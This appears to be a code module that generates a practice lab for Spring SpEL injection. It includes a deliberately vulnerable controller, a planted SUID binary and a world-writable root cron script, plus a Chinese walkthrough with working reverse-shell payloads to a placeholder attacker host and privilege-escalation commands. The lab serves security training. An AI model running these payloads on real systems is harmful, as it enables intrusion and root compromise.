export const SPEL_CONTROLLER_CODE = `package com.example.spel.controller;

import org.springframework.expression.Expression;
import org.springframework.expression.ExpressionParser;
import org.springframework.expression.spel.standard.SpelExpressionParser;
import org.springframework.expression.spel.support.StandardEvaluationContext;
import org.springframework.web.bind.annotation.*;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.beans.factory.annotation.Autowired;
import java.util.Date;
import javax.servlet.http.HttpServletRequest;

@RestController
@RequestMapping("/spel/vuln")
public class SpelController {

    @Autowired
    private JdbcTemplate jdbcTemplate;

    /**
     * 场景1：直接注入 (Direct Injection)
     * Payload: 1+1
     */
    @GetMapping("/direct")
    public String direct(@RequestParam String expression, HttpServletRequest request) {
        logAttack(expression, "PROCESSING", request.getRemoteAddr());
        try {
            ExpressionParser parser = new SpelExpressionParser();
            StandardEvaluationContext context = new StandardEvaluationContext();
            Expression exp = parser.parseExpression(expression);
            String result = exp.getValue(context, String.class);
            logAttack(expression, "SUCCESS: " + result, request.getRemoteAddr());
            return result;
        } catch (Exception e) {
            logAttack(expression, "ERROR: " + e.getMessage(), request.getRemoteAddr());
            return "Error: " + e.getMessage();
        }
    }

    /**
     * 场景2：拼接注入 (Concat Injection)
     * Payload: ') + 'hacked' + ('
     */
    @GetMapping("/concat")
    public String concat(@RequestParam String expression, HttpServletRequest request) {
        String template = "Hello, ('" + expression + "')!";
        // 修复：添加日志记录
        logAttack(template, "PROCESSING_CONCAT", request.getRemoteAddr());
        try {
            ExpressionParser parser = new SpelExpressionParser();
            String result = parser.parseExpression(template).getValue(String.class);
            logAttack(template, "SUCCESS: " + result, request.getRemoteAddr());
            return result;
        } catch (Exception e) {
            logAttack(template, "ERROR: " + e.getMessage(), request.getRemoteAddr());
            return "Error processing template";
        }
    }

    /**
     * 场景3：RCE 回显
     * 修复：正确转义 useDelimiter("\\\\A") 以匹配正则表达式 \\A (Start of string)
     */
    @GetMapping("/rce")
    public String rce(@RequestParam String cmd, HttpServletRequest request) {
        // 在 Java 字符串字面量中，"\\\\A" 代表字符串 "\A"，传递给正则引擎表示输入流开头
        String rcePayload = "new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec('" + cmd + "').getInputStream()).useDelimiter(\\\"\\\\\\\\A\\\").next()";
        
        logAttack(cmd, "RCE_ATTEMPT", request.getRemoteAddr());
        
        try {
            ExpressionParser parser = new SpelExpressionParser();
            String result = parser.parseExpression(rcePayload).getValue(String.class);
            return "RCE Output:\\n" + result;
        } catch (Exception e) {
             return "RCE Failed: " + e.getMessage();
        }
    }

    private void logAttack(String expression, String result, String ip) {
        try {
            String safeResult = (result != null && result.length() > 255) ? result.substring(0, 255) : result;
            jdbcTemplate.update(
                "INSERT INTO search_logs (expression, result, ip_address, created_at) VALUES (?, ?, ?, ?)",
                expression, safeResult, ip, new Date()
            );
        } catch (Exception e) {
            System.err.println("Log failed: " + e.getMessage());
        }
    }
}`;

export const SPEL_APP_JAVA_CODE = `package com.example.spel;

import org.springframework.boot.SpringApplication;
import org.springframework.boot.autoconfigure.SpringBootApplication;

@SpringBootApplication
public class SpelLabApplication {
    public static void main(String[] args) {
        SpringApplication.run(SpelLabApplication.class, args);
    }
}`;

export const POM_XML_CODE = `<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0" 
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>spel-lab</artifactId>
    <version>1.0.0</version>
    <parent>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-parent</artifactId>
        <version>2.7.18</version>
    </parent>
    <dependencies>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-web</artifactId>
        </dependency>
        <dependency>
            <groupId>org.springframework.boot</groupId>
            <artifactId>spring-boot-starter-jdbc</artifactId>
        </dependency>
        <dependency>
            <groupId>mysql</groupId>
            <artifactId>mysql-connector-java</artifactId>
            <version>5.1.49</version>
        </dependency>
    </dependencies>
    <properties>
        <java.version>1.8</java.version>
    </properties>
    <build>
        <plugins>
            <plugin>
                <groupId>org.springframework.boot</groupId>
                <artifactId>spring-boot-maven-plugin</artifactId>
            </plugin>
        </plugins>
    </build>
</project>`;

export const DOCKER_COMPOSE_CODE = `version: '3'
services:
  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: root
      MYSQL_DATABASE: spel_db
    volumes:
      - ./init.sql:/docker-entrypoint-initdb.d/init.sql
    networks:
      - spel-net
    healthcheck:
      test: ["CMD", "mysqladmin" ,"ping", "-h", "localhost"]
      timeout: 20s
      retries: 10

  spel_app:
    build: .
    ports:
      - "8080:8080" # Changed from 80 to 8080 to avoid Kali port conflicts
    depends_on:
      mysql:
        condition: service_healthy
    environment:
      SPRING_DATASOURCE_URL: jdbc:mysql://mysql:3306/spel_db?useSSL=false
      SPRING_DATASOURCE_USERNAME: root
      SPRING_DATASOURCE_PASSWORD: root
    volumes:
      - ./setup_suid.sh:/opt/setup_suid.sh
      - ./setup_cron.sh:/opt/setup_cron.sh
    # 启动顺序：
    # 1. 启动 crond (后台)
    # 2. 赋予脚本执行权限并运行配置脚本
    # 3. 启动 Java 应用
    command: sh -c "crond && chmod +x /opt/setup_*.sh && /opt/setup_suid.sh && /opt/setup_cron.sh && java -jar /app.jar"
    networks:
      - spel-net
    restart: always

networks:
  spel-net:
    driver: bridge`;

export const SETUP_SCRIPTS_CODE = `#!/bin/bash
# setup_suid.sh
cp /usr/bin/find /tmp/custom_find
chmod u+s /tmp/custom_find
echo "[+] SUID set on /tmp/custom_find."

# ---------------------------------------------------------
# setup_cron.sh (Alpine Linux compatible)
# Alpine 使用 /etc/crontabs/root 且需要 crond 服务运行

echo "#!/bin/sh" > /opt/cleanup.sh
echo "rm -rf /tmp/*.tmp" >> /opt/cleanup.sh
chmod 777 /opt/cleanup.sh

# 写入 Alpine 的 root crontab
echo "* * * * * /opt/cleanup.sh" >> /etc/crontabs/root
chmod 600 /etc/crontabs/root

echo "[+] Cron job configured for Alpine."`;

export const DOCKERFILE_CODE = `FROM openjdk:8-jdk-alpine
VOLUME /tmp
# 安装基础工具: bash, curl, busybox-extras (for telnet/netstat)
RUN apk add --no-cache bash curl busybox-extras
COPY target/spel-lab-1.0.0.jar app.jar
ENTRYPOINT ["java","-jar","/app.jar"]`;

export const INIT_SQL_CODE = `CREATE TABLE IF NOT EXISTS search_logs (
    id INT AUTO_INCREMENT PRIMARY KEY,
    expression VARCHAR(255),
    result VARCHAR(255),
    ip_address VARCHAR(50),
    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
);`;

export const BUILD_SCRIPT = `#!/bin/bash
set -e

echo "[*] Starting SpEL Lab Builder (Fixed Version)..."

# 1. Check Docker
if ! command -v docker &> /dev/null; then
    echo "[!] Docker missing. Installing..."
    curl -fsSL https://get.docker.com | sh
fi

# 2. Setup Dirs
BASE_DIR="spel-lab-env"
mkdir -p $BASE_DIR/src/main/java/com/example/spel/controller
cd $BASE_DIR

# 3. Write Files
echo "${POM_XML_CODE}" > pom.xml
echo "${DOCKERFILE_CODE}" > Dockerfile
echo "${DOCKER_COMPOSE_CODE}" > docker-compose.yml
echo "${INIT_SQL_CODE}" > init.sql

# Setup Scripts
cat > setup_suid.sh << 'EOF'
#!/bin/sh
cp /usr/bin/find /tmp/custom_find
chmod u+s /tmp/custom_find
EOF

cat > setup_cron.sh << 'EOF'
#!/bin/sh
echo "#!/bin/sh" > /opt/cleanup.sh
echo "rm -rf /tmp/*.tmp" >> /opt/cleanup.sh
chmod 777 /opt/cleanup.sh
echo "* * * * * /opt/cleanup.sh" >> /etc/crontabs/root
EOF

# Java Source
cat > src/main/java/com/example/spel/controller/SpelController.java << 'EOF'
${SPEL_CONTROLLER_CODE}
EOF

cat > src/main/java/com/example/spel/SpelLabApplication.java << 'EOF'
${SPEL_APP_JAVA_CODE}
EOF

# 4. Build
echo "[*] Building and Starting..."
docker-compose up -d --build

echo ""
echo "============================================================"
echo "   [SUCCESS] Lab Running on Port 8080!"
echo "   Target URL: http://<VM_IP>:8080/spel/vuln/direct"
echo "============================================================"
`;

export const README_CODE = `# SpEL Injection Lab - 渗透测试实战指南

本指南将指导你如何完成从**Web漏洞发现**到**Root权限获取**的完整渗透测试流程。

**靶机信息**:
- 端口: 8080 (Web), 3306 (MySQL)
- 操作系统: Alpine Linux (Docker容器)

---

## 第一阶段：Web 漏洞探测与利用 (Exploitation)

### 1. 漏洞发现 (Reconnaissance)
访问 \`http://TARGET:8080/spel/vuln/direct?expression=1+1\`
- **现象**: 页面返回 \`2\`。
- **结论**: 存在表达式注入，且服务器执行了加法运算。

### 2. RCE 漏洞验证
访问 \`http://TARGET:8080/spel/vuln/rce?cmd=id\`
- **现象**: 页面返回 \`uid=0(root) gid=0(root)...\`
- **注意**: 虽然容器内是 root，但这是 Docker 容器的 root，我们需要进一步探索或逃逸（本靶场主要考察 Linux 提权）。

### 3. 获取反弹 Shell (Initial Access)
我们需要一个交互式的 Shell 来进行后续操作。

**攻击机 (Kali) 监听**:
\`\`\`bash
nc -lvnp 4444
\`\`\`

**Payload 构造 (Bash)**:
由于 Java \`Runtime.exec\` 不支持管道符和重定向，我们需要用 Base64 编码来绕过限制。

1.  在 Kali 上编码命令:
    \`\`\`bash
    echo "bash -i >& /dev/tcp/YOUR_KALI_IP/4444 0>&1" | base64
    # 假设得到: YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK
    \`\`\`
2.  构造最终 RCE Payload:
    \`\`\`text
    bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjEK}|{base64,-d}|{bash,-i}
    \`\`\`
3.  发送请求 (URL 编码):
    \`\`\`bash
    curl "http://TARGET:8080/spel/vuln/rce?cmd=bash%20-c%20%7Becho%2CYmFzaCAtaSA%2BJiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA%2BJjEK%7D%7C%7Bbase64%2C-d%7D%7C%7Bbash%2C-i%7D"
    \`\`\`

此时，你的 \`nc\` 窗口应该会收到一个 Shell。

---

## 第二阶段：权限提升 (Privilege Escalation)

虽然你已经是 \`uid=0\`，但在很多 CTF 或真实场景中，你可能通过 Web 拿到的是 \`www-data\` 权限。本靶场模拟了两种经典的 Linux 提权配置，供练习使用。

### 1. SUID 提权利用
**探测**: 查找具有 SUID 权限的文件。
\`\`\`bash
find / -user root -perm -4000 2>/dev/null
\`\`\`
**发现**: 输出中包含 \`/tmp/custom_find\`，这是一个异常文件。

**利用**:
\`find\` 命令的 \`-exec\` 参数可以执行命令。如果 \`find\` 有 SUID 权限，它执行的命令也会继承 root 权限。
\`\`\`bash
/tmp/custom_find . -exec /bin/sh -p \; -quit
\`\`\`
*注: \`-p\` 参数对于 bash/sh 很重要，它允许保留有效用户 ID。*

---

### 2. Cron (定时任务) 提权利用
**探测**: 检查系统定时任务或可写文件。
\`\`\`bash
ls -la /opt/cleanup.sh
# 结果: -rwxrwxrwx 1 root root ...
\`\`\`
**发现**: \`/opt/cleanup.sh\` 是全员可写的 (777)，且通过 \`cat /etc/crontabs/root\` 可以看到它每分钟被 root 执行一次。

**利用**:
向该脚本追加反弹 Shell 代码或提权代码。

\`\`\`bash
# 写入反弹 Shell (连接到 Kali 的 5555 端口)
echo "nc YOUR_KALI_IP 5555 -e /bin/sh" >> /opt/cleanup.sh
\`\`\`

**攻击机监听**:
\`\`\`bash
nc -lvnp 5555
\`\`\`
等待 1 分钟，你将收到一个来自 root 的反弹 Shell。

---

## 附录：关于 SpEL 拼接注入 (/concat)
如果遇到 \`/concat\` 接口:
- **源码**: \`"Hello, ('" + expression + "')!"\`
- **目标**: 闭合单引号和括号，插入 SpEL 表达式。
- **Payload**: \`') + T(java.lang.Runtime).getRuntime().exec('id') + ('\`
- **URL**: \`http://TARGET:8080/spel/vuln/concat?expression=')%20%2B%20T(java.lang.Runtime).getRuntime().exec('id')%20%2B%20('\`
`;